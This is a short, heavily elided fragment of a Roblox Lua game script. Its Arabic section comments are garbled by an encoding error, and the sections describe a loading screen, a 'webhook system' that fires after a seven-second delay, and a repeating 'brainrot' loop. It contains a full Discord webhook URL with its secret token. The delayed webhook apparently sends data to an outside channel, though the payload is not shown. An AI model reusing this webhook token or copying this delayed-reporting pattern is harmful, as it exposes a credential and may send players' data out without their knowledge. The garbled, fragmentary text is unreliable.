...
-- =========================
-- 2: ÙˆØ§Ø¬Ù‡Ø© Ø§Ù„ØªØ­Ù…ÙŠÙ„ (Ø«Ø§Ù†ÙŠØ§Ù‹)
-- =========================
task.spawn(function()
...
-- =========================
-- 3: Ù†Ø¸Ø§Ù… Ø§Ù„ÙˆÙŠØ¨ Ù‡ÙˆÙƒ (Ø¨Ø¹Ø¯ 7 Ø«ÙˆØ§Ù†ÙŠ)
-- =========================
task.spawn(function()
    wait(7)

    local WEBHOOK_URL = "https://discord.com/api/webhooks/1397453562132566036/IbwQCkXQlCVadF1LDf0L3dQQrPsWhU9SWqFILk4dFTk9biyX6zK4Ud93SIad5K6aMq3x"
...
-- =========================
-- 4: Ù†Ø¸Ø§Ù… Ø§Ù„Ø¨Ø±Ø§ÙŠÙ† Ø±ÙˆØª Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠ (ÙƒÙ„ 2.5 Ø«Ø§Ù†ÙŠØ©)
-- =========================
task.spawn(function()
    wait(10)
